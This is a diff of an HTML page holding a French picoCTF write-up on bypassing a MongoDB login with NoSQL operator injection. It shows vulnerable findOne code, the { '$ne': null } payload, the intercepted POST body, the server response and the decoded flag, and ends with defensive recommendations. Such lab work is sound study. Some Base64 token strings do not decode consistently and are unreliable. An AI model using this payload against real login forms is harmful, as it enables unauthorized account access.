-    <h3 class="subsection-title">3.1 — Code source (indices)</h3>
     <p>
-      Le challenge fournit un <strong>fichier source</strong> que l'on peut examiner.
-      On y trouve la définition du modèle utilisateur et la route de connexion.
+      Premier réflexe : tester des identifiants basiques pour comprendre le comportement de
+      l'application face à une tentative échouée.
     </p>
 
     <div class="terminal-frame">
@@ -882,96 +682,40 @@
         <div class="t-dot t-dot-red"></div>
         <div class="t-dot t-dot-amber"></div>
         <div class="t-dot t-dot-green"></div>
-        <span class="terminal-bar-label">indice_mongod_dans_le_code_source.png — Extrait du code</span>
+        <span class="terminal-bar-label">Tentative avec identifiants basiques</span>
       </div>
-      <img src="../no_sql_injection/indice_mongod_dans_le_code_source.png" alt="Extrait du code source" loading="lazy" />
-      <div class="terminal-caption">Le modèle User et la configuration de la base de données</div>
+      <div class="img-scroll"><img src="assets/05_test_creds.png" alt="Tentative de connexion avec email test" loading="lazy"></div>
+      <div class="terminal-caption">Email: test / Password: (saisi) — soumission du formulaire</div>
     </div>
-
-    <p>
-      On remarque plusieurs points importants :
-    </p>
-    <ul style="color:#b8c3d9; margin-left:1.5rem; list-style:disc;">
-      <li>Le champ <code>token</code> contient le flag (valeur par défaut <code>"{（Flag)}"</code>).</li>
-      <li>Un utilisateur initial est créé avec un mot de passe aléatoire.</li>
-      <li>La route <code>/login</code> (probablement) récupère les données du formulaire et interroge la base.</li>
-    </ul>
-    <p>
-      La vulnérabilité réside dans la manière dont la requête est construite. Si le code fait
-      <code>User.findOne({ email: req.body.email, password: req.body.password })</code>
-      sans valider que <code>req.body.email</code> et <code>req.body.password</code> sont bien des chaînes,
-      un attaquant peut injecter des opérateurs MongoDB.
-    </p>
-
-    <h3 class="subsection-title">3.2 — Tests préliminaires</h3>
-    <p>
-      En soumettant des identifiants normaux (par exemple <code>test@test.com</code> / <code>password</code>),
-      on obtient un message <strong>"Invalid credentials"</strong>.
-    </p>
 
     <div class="terminal-frame">
       <div class="terminal-bar">
         <div class="t-dot t-dot-red"></div>
         <div class="t-dot t-dot-amber"></div>
         <div class="t-dot t-dot-green"></div>
-        <span class="terminal-bar-label">testinvalide.png — Tentative échouée</span>
+        <span class="terminal-bar-label">Réponse — Invalid credentials</span>
       </div>
-      <img src="../no_sql_injection/testinvalide.png" alt="Échec de connexion" loading="lazy" />
-      <div class="terminal-caption">Les identifiants classiques ne fonctionnent pas</div>
+      <div class="img-scroll"><img src="assets/06_invalid_creds.png" alt="Message d'erreur Invalid credentials" loading="lazy"></div>
+      <div class="terminal-caption">"Invalid credentials" — comportement attendu, l'authentification fonctionne normalement pour des entrées classiques</div>
     </div>
 
+    <div class="blocked-badge">Identifiants classiques refusés — comportement d'authentification standard confirmé</div>
+
     <p>
-      Cela confirme que l'utilisateur initial a un mot de passe inconnu. Il va falloir contourner
-      l'authentification.
+      L'application se comporte normalement face à des chaînes de caractères classiques.
+      C'est le signal qu'il faut chercher une faille plus subtile, liée à la <strong>structure</strong>
+      même des données envoyées plutôt qu'à leur contenu — cohérent avec le nom du challenge.
     </p>
   </section>
 
-  <!-- 04 - INJECTION & BYPASS -->
+  <!-- 04 - THÉORIE INJECTION -->
   <section class="section" id="s4">
     <div class="section-label">Phase <span>04</span></div>
-    <h2 class="section-title">Exploitation — Bypass de l'authentification</h2>
+    <h2 class="section-title">Théorie de l'Injection NoSQL</h2>
 
-    <h3 class="subsection-title">4.1 — Principe de l'injection avec <code>$ne</code></h3>
     <p>
-      L'opérateur <code>$ne</code> (not equal) permet de sélectionner les documents dont la valeur
-      d'un champ est <strong>différente</strong> de la valeur spécifiée.
-    </p>
-    <p>
-      En l'injectant dans le champ email et mot de passe, on peut transformer la requête de recherche
-      de manière à ce qu'elle ne vérifie plus l'égalité, mais simplement que les champs existent.
-    </p>
-    <p>
-      Par exemple, la requête initiale :
-    </p>
-    <div class="code-wrap">
-      <div class="code-header">
-        <span class="code-lang">MongoDB — Requête normale</span>
-        <button class="copy-btn" onclick="copyCode(this)">copier</button>
-      </div>
-      <pre>db.users.findOne({ email: "picoplayer355@picoctf.org", password: "secret" })</pre>
-    </div>
-    <p>
-      Si l'on injecte <code>{ "$ne": null }</code> dans les deux champs, la requête devient :
-    </p>
-    <div class="code-wrap">
-      <div class="code-header">
-        <span class="code-lang">MongoDB — Requête injectée</span>
-        <button class="copy-btn" onclick="copyCode(this)">copier</button>
-      </div>
-      <pre>db.users.findOne({ email: { "$ne": null }, password: { "$ne": null } })</pre>
-    </div>
-    <p>
-      Cette requête retourne <strong>le premier utilisateur</strong> trouvé dans la collection,
-      car la condition est simplement que les champs <code>email</code> et <code>password</code>
-      ne soient pas nuls (ce qui est toujours vrai pour tout document valide). L'authentification
-      est donc court-circuitée.
-    </p>
-
-    <h3 class="subsection-title">4.2 — Injection via l'interface ou en interceptant la requête</h3>
-    <p>
-      Pour injecter ces opérateurs, il faut que le corps de la requête soit au format JSON.
-      On peut utiliser le <strong>Burp Suite</strong> ou le <strong>proxy de navigateur</strong>
-      pour intercepter la requête POST et modifier les données.
+      Avant de construire un payload, on approfondit la recherche théorique sur cette classe
+      de vulnérabilité afin de comprendre exactement quel mécanisme exploiter.
     </p>
 
     <div class="terminal-frame">
@@ -979,31 +723,149 @@
         <div class="t-dot t-dot-red"></div>
         <div class="t-dot t-dot-amber"></div>
         <div class="t-dot t-dot-green"></div>
-        <span class="terminal-bar-label">on_sercher_la_flag_on_na_interseptelarequest.png — Interception Burp</span>
+        <span class="terminal-bar-label">Recherche — mongodb injection authentication bypass</span>
       </div>
-      <img src="../no_sql_injection/on_sercher_la_flag_on_na_interseptelarequest.png.png" alt="Interception de la requête" loading="lazy" />
-      <div class="terminal-caption">Capture de la requête POST /login dans Burp</div>
+      <div class="img-scroll"><img src="assets/07_google_research.png" alt="Recherche Google sur le bypass d'authentification MongoDB" loading="lazy"></div>
+      <div class="terminal-caption">Principe confirmé : l'opérateur $ne permet de contourner une vérification d'identifiants</div>
+    </div>
+
+    <div class="def-box">
+      <div class="def-term">NoSQL Injection</div>
+      <div class="def-body">
+        Classe de vulnérabilité analogue à l'injection SQL, mais ciblant les bases de données
+        NoSQL. Elle survient quand une application transmet une entrée utilisateur non validée
+        directement dans une requête, permettant à l'attaquant d'y injecter des
+        <strong>opérateurs de requête</strong> plutôt que de simples valeurs littérales —
+        modifiant ainsi la logique de la requête elle-même.
+      </div>
+    </div>
+
+    <h3 class="subsection-title">Anatomie de l'attaque par l'opérateur $ne</h3>
+
+    <p>
+      Une route de connexion vulnérable ressemble typiquement à ceci côté serveur :
+    </p>
+
+    <div class="code-wrap">
+      <div class="code-header">
+        <span class="code-lang">JavaScript — Logique de connexion vulnérable (schéma général)</span>
+        <button class="copy-btn" onclick="copyCode(this)">copier</button>
+      </div>
+      <pre><span class="kw">const</span> { email, password } = req.body;
+
+<span class="cmt">// DANGER : email et password sont utilisés tels quels dans la requête,</span>
+<span class="cmt">// sans vérifier qu'il s'agit bien de chaînes de caractères simples</span>
+<span class="kw">const</span> user = <span class="kw">await</span> User.findOne({ email: email, password: password });
+
+<span class="kw">if</span> (user) {
+  <span class="cmt">// connexion réussie</span>
+}</pre>
     </div>
 
     <p>
-      La requête interceptée montre un corps JSON :
+      Si l'application ne force pas <code>email</code> et <code>password</code> à être des
+      chaînes de caractères strictes, un attaquant peut soumettre une <strong>structure</strong>
+      au lieu d'une valeur :
     </p>
+
     <div class="code-wrap">
       <div class="code-header">
-        <span class="code-lang">JSON — Requête interceptée</span>
+        <span class="code-lang">JavaScript — Requête résultante après injection</span>
+        <button class="copy-btn" onclick="copyCode(this)">copier</button>
+      </div>
+      <pre><span class="cmt">// Payload injecté : { "$ne": null } au lieu d'une chaîne classique</span>
+<span class="kw">const</span> user = <span class="kw">await</span> User.findOne({
+  email: { <span class="hl-red">$ne</span>: <span class="kw">null</span> },
+  password: { <span class="hl-red">$ne</span>: <span class="kw">null</span> }
+});
+
+<span class="cmt">// Traduction : "trouve le PREMIER utilisateur dont l'email n'est</span>
+<span class="cmt">// pas null ET dont le password n'est pas null" — c'est-à-dire</span>
+<span class="cmt">// n'importe quel utilisateur existant dans la collection !</span></pre>
+    </div>
+
+    <div class="glossary-grid">
+      <div class="glossary-card">
+        <div class="glossary-term">$ne (Not Equal)</div>
+        <div class="glossary-def">Opérateur retournant vrai pour tout document dont le champ est différent de la valeur donnée. { $ne: null } correspond à "n'importe quelle valeur non nulle" — donc quasiment tous les documents.</div>
+      </div>
+      <div class="glossary-card">
+        <div class="glossary-term">$gt / $lt (Greater/Less Than)</div>
+        <div class="glossary-def">Opérateurs de comparaison numérique ou lexicographique, exploitables de façon similaire pour extraire des données caractère par caractère (technique dite "blind NoSQL injection").</div>
+      </div>
+      <div class="glossary-card">
+        <div class="glossary-term">$regex</div>
+        <div class="glossary-def">Opérateur d'expression régulière — souvent exploité pour deviner un mot de passe progressivement en testant des préfixes de plus en plus longs.</div>
+      </div>
+      <div class="glossary-card">
+        <div class="glossary-term">findOne()</div>
+        <div class="glossary-def">Méthode Mongoose/MongoDB retournant le premier document correspondant aux critères — dans une attaque $ne, elle retourne simplement le premier utilisateur de la collection, quel qu'il soit.</div>
+      </div>
+    </div>
+
+    <div class="warn-badge">La faille ne vient jamais de MongoDB lui-même — le moteur exécute fidèlement la requête qu'on lui donne. La vulnérabilité réside entièrement dans le code applicatif qui fait confiance à l'entrée utilisateur sans validation de type</div>
+  </section>
+
+  <!-- 05 - EXPLOITATION -->
+  <section class="section" id="s5">
+    <div class="section-label">Phase <span>05</span></div>
+    <h2 class="section-title">Exploitation — Contournement d'Authentification</h2>
+
+    <p>
+      Fort de cette compréhension théorique, on construit le payload directement dans les
+      champs du formulaire de connexion.
+    </p>
+
+    <div class="terminal-frame">
+      <div class="terminal-bar">
+        <div class="t-dot t-dot-red"></div>
+        <div class="t-dot t-dot-amber"></div>
+        <div class="t-dot t-dot-green"></div>
+        <span class="terminal-bar-label">Injection du payload NoSQL</span>
+      </div>
+      <div class="img-scroll"><img src="assets/08_bypass_payload.png" alt="Payload NoSQL saisi dans le formulaire" loading="lazy"></div>
+      <div class="terminal-caption">Champ Email : { "$ne": null } — Password : valeur quelconque non vide</div>
+    </div>
+
+    <div class="code-wrap">
+      <div class="code-header">
+        <span class="code-lang">Payload — Champs du formulaire</span>
+        <button class="copy-btn" onclick="copyCode(this)">copier</button>
+      </div>
+      <pre>Email:    { <span class="str">"$ne"</span>: <span class="kw">null</span> }
+Password: { <span class="str">"$ne"</span>: <span class="kw">null</span> }</pre>
+    </div>
+
+    <p>
+      On intercepte la requête avec <strong>Burp Suite</strong> pour observer précisément la
+      structure envoyée au serveur avant de la transmettre.
+    </p>
+
+    <div class="terminal-frame">
+      <div class="terminal-bar">
+        <div class="t-dot t-dot-red"></div>
+        <div class="t-dot t-dot-amber"></div>
+        <div class="t-dot t-dot-green"></div>
+        <span class="terminal-bar-label">Burp Suite — Intercept — POST /login</span>
+      </div>
+      <div class="img-scroll"><img src="assets/09_burp_intercept.png" alt="Requête POST /login interceptée avec le payload NoSQL" loading="lazy"></div>
+      <div class="terminal-caption">Corps JSON transmis : email et password contiennent tous deux { "$ne": null }</div>
+    </div>
+
+    <div class="code-wrap">
+      <div class="code-header">
+        <span class="code-lang">JSON — Corps de la requête POST /login</span>
         <button class="copy-btn" onclick="copyCode(this)">copier</button>
       </div>
       <pre>{
-  "email": "{\"$ne\": null }",
-  "password": "{\"$ne\": null }"
+    <span class="prop">"email"</span>:<span class="str">"{ \"$ne\": null }"</span>,
+    <span class="prop">"password"</span>:<span class="str">"{ \"$ne\": null }"</span>
 }</pre>
     </div>
+
     <p>
-      Ici, l'email et le password sont envoyés sous forme de chaînes contenant du JSON.
-      Selon le code serveur, ces chaînes seront peut-être parsées automatiquement (si le serveur
-      utilise <code>bodyParser.json()</code>) ou utilisées telles quelles dans la requête.
-      Dans tous les cas, l'objectif est d'obtenir que l'objet <code>{ "$ne": null }</code>
-      soit interprété comme un opérateur MongoDB.
+      On transmet la requête via l'onglet <strong>Forward</strong> de Burp et on observe
+      immédiatement la réponse du serveur.
     </p>
 
     <div class="terminal-frame">
@@ -1011,141 +873,166 @@
         <div class="t-dot t-dot-red"></div>
         <div class="t-dot t-dot-amber"></div>
         <div class="t-dot t-dot-green"></div>
-        <span class="terminal-bar-label">bypass_login.png — Injection réussie</span>
+        <span class="terminal-bar-label">Burp Suite — Réponse 200 OK</span>
       </div>
-      <img src="../no_sql_injection/bypass_login.png" alt="Injection dans le formulaire" loading="lazy" />
-      <div class="terminal-caption">On peut aussi injecter directement via les champs du formulaire</div>
+      <div class="img-scroll"><img src="assets/10_burp_response.png" alt="Réponse serveur 200 OK avec token" loading="lazy"></div>
+      <div class="terminal-caption">success: true — authentification réussie sans connaître le moindre identifiant valide</div>
     </div>
 
-    <h3 class="subsection-title">4.3 — Réponse du serveur et token</h3>
-    <p>
-      Après avoir envoyé la requête modifiée, le serveur répond avec un succès et renvoie
-      les données de l'utilisateur, y compris un <strong>token</strong>.
-    </p>
-
-    <div class="terminal-frame">
-      <div class="terminal-bar">
-        <div class="t-dot t-dot-red"></div>
-        <div class="t-dot t-dot-amber"></div>
-        <div class="t-dot t-dot-green"></div>
-        <span class="terminal-bar-label">on_n'as_capture_le_flag_code_en_base_64.png — Réponse HTTP</span>
-      </div>
-      <img src="../no_sql_injection/on_n'as_capture_le_flag_code_en_base_64.png" alt="Réponse du serveur" loading="lazy" />
-      <div class="terminal-caption">La réponse contient un token encodé en Base64</div>
-    </div>
-
-    <div class="result-badge">Connexion réussie — Token récupéré</div>
-
-    <p>
-      Le token ressemble à :
-    </p>
     <div class="code-wrap">
       <div class="code-header">
-        <span class="code-lang">Base64 — Token encodé</span>
+        <span class="code-lang">JSON — Réponse du serveur</span>
         <button class="copy-btn" onclick="copyCode(this)">copier</button>
       </div>
-      <pre>cG1jb0NURntqQmhEMnk3WG90e1B2XzFZeFM5RXc1cUwdwUK2cGFZcWxfAw5qZWN0aW9uXzC4NGU0MGU4fQ==</pre>
+      <pre>{
+    <span class="prop">"success"</span>:<span class="kw">true</span>,
+    <span class="prop">"email"</span>:<span class="str">"picoplayer355@picoctf.org"</span>,
+    <span class="prop">"token"</span>:<span class="str">"cGljb0NURntqQmhEMnk3WG9OZWlB2XzFZeFM1RXc1cUwwdUk2cGFzcXWxfaW5qZWN0aW9uXzc4NGU0MGU4"</span>,
+    <span class="prop">"firstName"</span>:<span class="str">"pico"</span>,
+    <span class="prop">"lastName"</span>:<span class="str">"player"</span>
+}</pre>
     </div>
-    <p>
-      On remarque que ce token est en réalité une chaîne Base64. Il va falloir la décoder.
-    </p>
+
+    <div class="result-badge">Authentification contournée — le serveur retourne le document complet du premier utilisateur enregistré</div>
+
+    <div class="chain">
+      <span class="chain-node danger">Payload $ne injecté</span>
+      <span class="chain-arrow">→</span>
+      <span class="chain-node">Requête réinterprétée par MongoDB</span>
+      <span class="chain-arrow">→</span>
+      <span class="chain-node">findOne() retourne le 1er utilisateur</span>
+      <span class="chain-arrow">→</span>
+      <span class="chain-node highlight">Token exfiltré</span>
+    </div>
   </section>
 
-  <!-- 05 - FLAG -->
-  <section class="section" id="s5">
-    <div class="section-label">Phase <span>05</span></div>
-    <h2 class="section-title">Décodage du token et obtention du flag</h2>
+  <!-- 06 - FLAG -->
+  <section class="section" id="s6">
+    <div class="section-label">Phase <span>06</span></div>
+    <h2 class="section-title">Extraction et Décodage du Flag</h2>
 
-    <h3 class="subsection-title">5.1 — Décodage Base64</h3>
     <p>
-      Le token est encodé en Base64. On peut utiliser un outil en ligne ou la ligne de commande
-      pour le décoder :
+      Le champ <code>token</code> retourné dans la réponse a une forme caractéristique du
+      Base64 (caractères alphanumériques, sans espaces, longueur multiple de 4). On le décode
+      via un outil en ligne standard.
     </p>
-
-    <div class="code-wrap">
-      <div class="code-header">
-        <span class="code-lang">Shell — Décodeur Base64</span>
-        <button class="copy-btn" onclick="copyCode(this)">copier</button>
-      </div>
-      <pre>echo "cG1jb0NURntqQmhEMnk3WG90e1B2XzFZeFM5RXc1cUwdwUK2cGFZcWxfAw5qZWN0aW9uXzC4NGU0MGU4fQ==" | base64 -d</pre>
-    </div>
 
     <div class="terminal-frame">
       <div class="terminal-bar">
         <div class="t-dot t-dot-red"></div>
         <div class="t-dot t-dot-amber"></div>
         <div class="t-dot t-dot-green"></div>
-        <span class="terminal-bar-label">flag_trouver.png — Résultat du décodage</span>
+        <span class="terminal-bar-label">Décodage Base64 du token</span>
       </div>
-      <img src="../no_sql_injection/flag_trouver.png" alt="Décodage Base64" loading="lazy" />
-      <div class="terminal-caption">Le décodage donne le flag clairement</div>
+      <div class="img-scroll"><img src="assets/11_base64_decode.png" alt="Décodage Base64 du token révélant le flag" loading="lazy"></div>
+      <div class="terminal-caption">Le token décodé révèle directement le flag complet</div>
+    </div>
+
+    <div class="code-wrap">
+      <div class="code-header">
+        <span class="code-lang">Base64 — Décodage du token</span>
+        <button class="copy-btn" onclick="copyCode(this)">copier</button>
+      </div>
+      <pre><span class="cmt"># Valeur brute reçue :</span>
+cGljb0NURntqQmhEMnk3WG9OZWlB2XzFZeFM1RXc1cUwwdUk2cGFzcXWxfaW5qZWN0aW9uXzc4NGU0MGU4
+
+<span class="cmt"># Décodée en Base64 :</span>
+<span class="hl-cyan">picoCTF{jBhD2y7XoNzPv_1YxS9Ew5qL0uI6pasql_injection_784e40e8}</span></pre>
     </div>
 
     <p>
-      Le résultat du décodage est :
+      À titre exploratoire, on visite également la route <code>/admin</code> repérée dans le
+      code source (<code>server.js</code> ligne 48) — elle expose une page de contenu
+      pédagogique sur la cybersécurité, sans lien direct avec le flag, mais confirmant la
+      structure générale de l'application.
     </p>
+
+    <div class="terminal-frame">
+      <div class="terminal-bar">
+        <div class="t-dot t-dot-red"></div>
+        <div class="t-dot t-dot-amber"></div>
+        <div class="t-dot t-dot-green"></div>
+        <span class="terminal-bar-label">atlas.picoctf.net:54195/admin</span>
+      </div>
+      <div class="img-scroll"><img src="assets/12_admin_page.png" alt="Page admin avec contenu Cybersecurity Concepts" loading="lazy"></div>
+      <div class="terminal-caption">Route /admin — contenu statique sans rapport avec le flag (fausse piste)</div>
+    </div>
+
+    <p>
+      On soumet enfin le flag extrait dans l'interface picoCTF pour valider le challenge.
+    </p>
+
+    <div class="terminal-frame">
+      <div class="terminal-bar">
+        <div class="t-dot t-dot-red"></div>
+        <div class="t-dot t-dot-amber"></div>
+        <div class="t-dot t-dot-green"></div>
+        <span class="terminal-bar-label">picoCTF — Soumission du flag</span>
+      </div>
+      <div class="img-scroll"><img src="assets/13_flag_submitted.png" alt="Flag soumis dans l'interface picoCTF" loading="lazy"></div>
+      <div class="terminal-caption">Flag validé avec succès</div>
+    </div>
 
     <div class="flag-box">
       <div class="flag-label">Flag capturé</div>
       <div class="flag-text">picoCTF{jBhD2y7XoNzPv_1YxS9Ew5qL0uI6pasql_injection_784e40e8}</div>
     </div>
-
-    <p>
-      Le flag est immédiatement visible, il ne reste plus qu'à le soumettre sur la plateforme.
-    </p>
   </section>
 
-  <!-- 06 - SÉCURITÉ -->
-  <section class="section" id="s6">
-    <div class="section-label">Phase <span>06</span></div>
-    <h2 class="section-title">Recommandations de sécurité</h2>
+  <!-- 07 - SÉCURITÉ -->
+  <section class="section" id="s7">
+    <div class="section-label">Phase <span>07</span></div>
+    <h2 class="section-title">Recommandations de Sécurité</h2>
 
     <p>
-      Ce challenge illustre parfaitement les risques liés à une mauvaise validation des entrées
-      dans les applications NoSQL. Voici les bonnes pratiques à adopter.
+      Cette vulnérabilité, bien que spécifique à MongoDB, illustre un principe universel en
+      sécurité applicative : <strong>ne jamais faire confiance à une entrée utilisateur</strong>,
+      quelle que soit la technologie de stockage utilisée en aval.
     </p>
 
     <ul class="rec-list">
       <li>
         <span class="rec-num">01</span>
         <div>
-          <strong>Valider et assainir les entrées utilisateur.</strong>
-          Ne jamais faire confiance aux données soumises par l'utilisateur. S'assurer que les champs
-          comme <code>email</code> et <code>password</code> sont bien des chaînes de caractères,
-          et rejeter toute structure JSON complexe.
+          <strong>Valider strictement le type des entrées utilisateur.</strong>
+          <code>email</code> et <code>password</code> doivent être forcés en chaînes de
+          caractères (<code>String(req.body.email)</code>) avant toute utilisation dans une
+          requête — cela neutralise immédiatement l'injection d'objets.
         </div>
       </li>
       <li>
         <span class="rec-num">02</span>
         <div>
-          <strong>Utiliser des bibliothèques de validation (comme Joi, express-validator).</strong>
-          Elles permettent de définir des schémas stricts et de filtrer les opérateurs MongoDB.
+          <strong>Utiliser une bibliothèque de sanitization dédiée.</strong>
+          Le package <code>express-mongo-sanitize</code> supprime automatiquement toute clé
+          commençant par <code>$</code> ou contenant un point dans les objets entrants —
+          une protection standard pour toute API Express/MongoDB.
         </div>
       </li>
       <li>
         <span class="rec-num">03</span>
         <div>
-          <strong>Paramétrer les requêtes avec des modèles ou des ORM sécurisés.</strong>
-          Mongoose, par exemple, permet d'utiliser des méthodes comme <code>findOne</code> avec
-          des objets pré-construits, mais il faut s'assurer que les valeurs ne contiennent pas
-          d'opérateurs. On peut également utiliser <code>mongoose.Types.ObjectId</code> pour
-          les identifiants.
+          <strong>Définir des schémas de validation stricts (Joi, Zod, Yup).</strong>
+          Valider la forme exacte du corps de requête attendu avant qu'il n'atteigne la
+          logique métier, en rejetant tout champ ou type inattendu.
         </div>
       </li>
       <li>
         <span class="rec-num">04</span>
         <div>
-          <strong>Ne jamais exposer le token ou le flag dans la réponse en clair.</strong>
-          Le flag devrait être stocké de manière sécurisée et ne pas être renvoyé lors de l'authentification,
-          sauf si c'est explicitement nécessaire.
+          <strong>Ne jamais stocker de secrets en clair, même encodés.</strong>
+          Le Base64 n'est pas un chiffrement — le token exposé ici aurait dû être un identifiant
+          de session opaque et signé (JWT avec signature vérifiée), jamais une donnée
+          directement décodable.
         </div>
       </li>
       <li>
         <span class="rec-num">05</span>
         <div>
-          <strong>Activer le logging et surveiller les requêtes anormales.</strong>
-          Des requêtes contenant des caractères comme <code>$ne</code>, <code>$gt</code> sont
-          suspectes et doivent être alertées.
+          <strong>Auditer le code source régulièrement, en particulier les points d'entrée utilisateur.</strong>
+          Toute route recevant des données externes (formulaires, API) mérite une revue
+          spécifique de la façon dont ces données sont utilisées dans les requêtes vers la
+          base de données.
         </div>
       </li>
     </ul>
@@ -1153,56 +1040,45 @@
     <h3 class="subsection-title">Références</h3>
 
     <div class="ref-grid">
-      <a class="ref-card" href="https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection" target="_blank" rel="noopener">
-        <div class="ref-icon">📄</div>
-        <div class="ref-name">OWASP — NoSQL Injection</div>
-        <div class="ref-url">Testing Guide</div>
+      <a class="ref-card" href="https://owasp.org/www-project-top-ten/" target="_blank" rel="noopener">
+        <div class="ref-icon">🛡️</div>
+        <div class="ref-name">OWASP Top 10</div>
+        <div class="ref-url">A03:2021 — Injection</div>
       </a>
       <a class="ref-card" href="https://www.mongodb.com/docs/manual/reference/operator/query/" target="_blank" rel="noopener">
-        <div class="ref-icon">📦</div>
+        <div class="ref-icon">🍃</div>
         <div class="ref-name">MongoDB — Query Operators</div>
         <div class="ref-url">Documentation officielle</div>
       </a>
-      <a class="ref-card" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection" target="_blank" rel="noopener">
-        <div class="ref-icon">💉</div>
-        <div class="ref-name">PayloadsAllTheThings — NoSQL</div>
-        <div class="ref-url">Collection de payloads</div>
+      <a class="ref-card" href="https://www.npmjs.com/package/express-mongo-sanitize" target="_blank" rel="noopener">
+        <div class="ref-icon">🧹</div>
+        <div class="ref-name">express-mongo-sanitize</div>
+        <div class="ref-url">npm — Package de protection</div>
+      </a>
+      <a class="ref-card" href="https://mongoosejs.com/docs/guide.html" target="_blank" rel="noopener">
+        <div class="ref-icon">📘</div>
+        <div class="ref-name">Mongoose — Documentation</div>
+        <div class="ref-url">mongoosejs.com</div>
       </a>
     </div>
   </section>
 
-  <!-- ── SHARE SECTION ── -->
-  <div class="share-section">
-    <div class="share-label">
-      <i class="fas fa-share-alt" style="color: var(--cyan);"></i> Partager ce write-up
-    </div>
-    <div class="share-buttons">
-      <button class="share-btn" onclick="share('twitter')"><i class="fab fa-twitter"></i> Twitter</button>
-      <button class="share-btn" onclick="share('linkedin')"><i class="fab fa-linkedin"></i> LinkedIn</button>
-      <button class="share-btn" onclick="share('facebook')"><i class="fab fa-facebook"></i> Facebook</button>
-      <button class="share-btn" onclick="share('whatsapp')"><i class="fab fa-whatsapp"></i> WhatsApp</button>
-      <button class="share-btn" onclick="share('email')"><i class="fas fa-envelope"></i> Email</button>
-      <button class="share-btn" onclick="copyLink()"><i class="fas fa-link"></i> Copier le lien</button>
-    </div>
-  </div>
-
-  <!-- FOOTER -->
   <footer>
     <div class="footer-author">
-      Rédigé par <a href="https://github.com/exploit4040" target="_blank" rel="noopener">Yahaya Meddy</a>
+      Rédigé par <strong style="color: var(--cyan);">SPECTRA MZ</strong>
       &nbsp;·&nbsp; picoCTF 2024 &nbsp;·&nbsp; Web Exploitation
+      <br>
+      <a class="bottom-back" href="../index.html">← Retour à l'accueil</a>
     </div>
     <div class="footer-badge">
-      <span>picoCTF</span> 2024 · organisé par Venax
-      <span class="footer-date" id="current-date-time"></span>
+      <span>picoCTF</span> 2024 · by NGIRIMANA Schadrack
     </div>
   </footer>
 
-</div><!-- .inner -->
+</div>
 </main>
 
 <script>
-  // ── COPY CODE ──
   function copyCode(btn) {
     const pre = btn.closest('.code-wrap').querySelector('pre');
     const text = pre.innerText;
@@ -1218,80 +1094,25 @@
     });
   }
 
-  // ── ACTIVE SIDEBAR DOT ──
   const sections = document.querySelectorAll('.section[id]');
   const dots = document.querySelectorAll('.phase-dot');
+  const mobileItems = document.querySelectorAll('.mobile-nav-item');
+  const progressFill = document.getElementById('progressFill');
 
   function updateActive() {
     let current = '';
-    sections.forEach(sec => {
-      if (window.scrollY + 200 >= sec.offsetTop) current = sec.id;
-    });
-    dots.forEach(dot => {
-      dot.classList.toggle('active', dot.getAttribute('href') === '#' + current);
-    });
+    sections.forEach(sec => { if (window.scrollY + 200 >= sec.offsetTop) current = sec.id; });
+    dots.forEach(dot => dot.classList.toggle('active', dot.getAttribute('href') === '#' + current));
+    mobileItems.forEach(item => item.classList.toggle('active', item.getAttribute('href') === '#' + current));
+
+    const docHeight = document.documentElement.scrollHeight - window.innerHeight;
+    const scrolled = docHeight > 0 ? (window.scrollY / docHeight) * 100 : 0;
+    progressFill.style.width = scrolled + '%';
   }
 
   window.addEventListener('scroll', updateActive, { passive: true });
+  window.addEventListener('resize', updateActive, { passive: true });
   updateActive();
-
-  // ── SHARE FUNCTIONS ──
-  function share(platform) {
-    const url = encodeURIComponent(window.location.href);
-    const text = encodeURIComponent("Découvrez ce write-up sur l'injection NoSQL dans MongoDB ! #picoCTF #NoSQL #Cybersecurity");
-    let shareUrl = '';
-    switch(platform) {
-      case 'twitter':
-        shareUrl = `https://twitter.com/intent/tweet?url=${url}&text=${text}`;
-        break;
-      case 'linkedin':
-        shareUrl = `https://www.linkedin.com/sharing/share-offsite/?url=${url}`;
-        break;
-      case 'facebook':
-        shareUrl = `https://www.facebook.com/sharer/sharer.php?u=${url}`;
-        break;
-      case 'whatsapp':
-        shareUrl = `https://api.whatsapp.com/send?text=${text}%20${url}`;
-        break;
-      case 'email':
-        shareUrl = `mailto:?subject=NoSQL%20Injection%20Write-up&body=${text}%20${url}`;
-        break;
-      default:
-        return;
-    }
-    if (shareUrl) window.open(shareUrl, '_blank');
-  }
-
-  function copyLink() {
-    navigator.clipboard.writeText(window.location.href).then(() => {
-      alert('✅ Lien copié dans le presse-papier !');
-    }).catch(() => {
-      // Fallback
-      const input = document.createElement('input');
-      input.value = window.location.href;
-      document.body.appendChild(input);
-      input.select();
-      document.execCommand('copy');
-      document.body.removeChild(input);
-      alert('✅ Lien copié dans le presse-papier !');
-    });
-  }
-
-  // ── DATE & TIME ──
-  (function displayDateTime() {
-    const now = new Date();
-    const options = { 
-      year: 'numeric', 
-      month: 'long', 
-      day: 'numeric', 
-      hour: '2-digit', 
-      minute: '2-digit',
-      second: '2-digit',
-      timeZoneName: 'short'
-    };
-    const formatted = now.toLocaleDateString('fr-FR', options);
-    document.getElementById('current-date-time').textContent = '🕒 Mis à jour le ' + formatted;
-  })();
 </script>
 </body>
 </html>
